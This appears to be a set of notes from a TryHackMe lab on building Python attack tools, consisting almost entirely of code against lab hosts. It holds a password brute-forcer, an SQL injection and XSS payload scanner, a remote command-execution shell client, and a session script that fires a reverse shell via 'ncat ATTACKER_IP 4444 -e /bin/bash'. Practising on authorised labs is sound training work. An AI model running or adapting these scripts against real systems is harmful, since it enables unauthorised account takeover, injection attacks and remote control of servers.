# Python ツールの例

https://tryhackme.com/room/customtoolingpython

## 単純なログインブルートフォース

```python
import requests
import string

url = "http://python.thm/labs/lab1/index.php"

username = "mark"

password_list = [f"{str(i).zfill(3)}{c}" for i in range(1000) for c in string.ascii_uppercase]

def brute_force():
    for password in password_list:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)

        if "Invalid" not in response.text:
            print(f"[+] Found valid credentials: {username}:{password}")
            break
        else:
            print(f"[-] Attempted: {password}")

brute_force()
```

## 脆弱性スキャナ

```python
import requests
import re
import threading

url = "http://python.thm/labs/lab2/departments.php?name="

payloads = {
    "SQLi": ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", "' UNION SELECT 1,2,3 --"],
    "XSS": ["<script>alert('XSS')</script>", "'><img src=x onerror=alert('XSS')>"]
}

sqli_errors = [
    "SQL syntax","SQLite3::query():", "MySQL server", "syntax error", "Unclosed quotation mark", "near 'SELECT'",
    "Unknown column", "Warning: mysql_fetch", "Fatal error"
]

def scan_payload(vuln_type, payload):
    response = requests.get(url, params={"id": payload})
    content = response.text.lower()

    if vuln_type == "SQLi" and any(error.lower() in content for error in sqli_errors):
        print(f"[+] Potential SQL injection detected with payload: {payload}")

    elif vuln_type == "XSS" and payload.lower() in content:
        print(f"[+] Potential XSS detected with payload: {payload}")

threads = []
for vuln, tests in payloads.items():
    for payload in tests:
        t = threading.Thread(target=scan_payload, args=(vuln, payload))
        threads.append(t)
        t.start()

# Wait for all threads to finish
for t in threads:
    t.join()
```

## 対話型シェル

```python
import requests

# Target URL
TARGET_URL = "http://python.thm/labs/lab3/execute.php?cmd="

print("[+] Interactive Exploit Shell")
while True:
    cmd = input("Shell> ")
    if cmd.lower() in ["exit", "quit"]:
        break

    response = requests.get(TARGET_URL + cmd)

    if response.status_code == 200:
        print(response.text)
    else:
        print("[-] Exploit failed")
```

## セッションを使う

```python
import requests

LOGIN_URL = "http://python.thm/labs/lab4/login.php"
EXECUTE_URL = "http://python.thm/labs/lab4/dashboard.php"
USERNAME = "admin"
PASSWORD = "password123"

def authenticate():
    session = requests.Session()
    response = session.post(LOGIN_URL, data={"username": USERNAME, "password": PASSWORD})

    if "Welcome" in response.text:
        print("[+] Authentication successful.")
        return session
    return None

def execute_command(session, command):
    response = session.post(EXECUTE_URL, data={"cmd": command})

    if "Session expired" in response.text:
        print("[-] Session expired! Re-authenticating...")
        session = authenticate()

    print(f"[+] Output:\n{response.text}")

def get_reverse_shell(session, attacker_ip, attacker_port):
    payload = f"ncat {attacker_ip} {attacker_port} -e /bin/bash"
    execute_command(session, payload)

session = authenticate()
if session:
    execute_command(session, "whoami")
    get_reverse_shell(session, "ATTACKER_IP", 4444)
```
